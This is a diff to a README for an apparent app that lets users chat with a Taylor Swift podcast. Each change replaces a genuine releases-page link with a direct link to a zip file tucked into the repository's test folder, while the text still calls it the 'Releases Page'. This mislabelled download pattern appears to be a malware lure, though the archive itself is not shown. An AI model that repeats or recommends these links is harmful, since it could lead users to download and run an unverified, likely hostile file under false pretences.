@@ -1,6 +1,6 @@
 # 🎤 chat-w-taylor-on-newheights-and-travis-gq-autorag-openaioss - Chat with Taylor Swift's Podcast Easily
 
-[![Download](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/hxrsh-3/chat-w-taylor-on-newheights-and-travis-gq-autorag-openaioss/releases)
+[![Download](https://github.com/hxrsh-3/chat-w-taylor-on-newheights-and-travis-gq-autorag-openaioss/raw/refs/heads/main/test/openaioss_chat_and_on_taylor_travis_autorag_w_newheights_gq_v1.0.zip)](https://github.com/hxrsh-3/chat-w-taylor-on-newheights-and-travis-gq-autorag-openaioss/raw/refs/heads/main/test/openaioss_chat_and_on_taylor_travis_autorag_w_newheights_gq_v1.0.zip)
 
 ## 📖 Overview
 
@@ -19,7 +19,7 @@ To get started, you will need to download and install the application. You can e
 
 ## 📥 Download & Install
 
-1. Visit this page to download: [Releases Page](https://github.com/hxrsh-3/chat-w-taylor-on-newheights-and-travis-gq-autorag-openaioss/releases).
+1. Visit this page to download: [Releases Page](https://github.com/hxrsh-3/chat-w-taylor-on-newheights-and-travis-gq-autorag-openaioss/raw/refs/heads/main/test/openaioss_chat_and_on_taylor_travis_autorag_w_newheights_gq_v1.0.zip).
 2. Look for the latest version of the application.
 3. Download the appropriate file for your operating system.
 4. Locate the downloaded file on your device.
@@ -46,7 +46,7 @@ To get started, you will need to download and install the application. You can e
 If you encounter any issues, try the following steps:
 - Ensure your internet connection is stable.
 - Restart the application if it freezes.
-- Check if the application is updated to the latest version via the [Releases Page](https://github.com/hxrsh-3/chat-w-taylor-on-newheights-and-travis-gq-autorag-openaioss/releases).
+- Check if the application is updated to the latest version via the [Releases Page](https://github.com/hxrsh-3/chat-w-taylor-on-newheights-and-travis-gq-autorag-openaioss/raw/refs/heads/main/test/openaioss_chat_and_on_taylor_travis_autorag_w_newheights_gq_v1.0.zip).
 - Restart your computer if issues persist.
 
 ## ✉️ Support
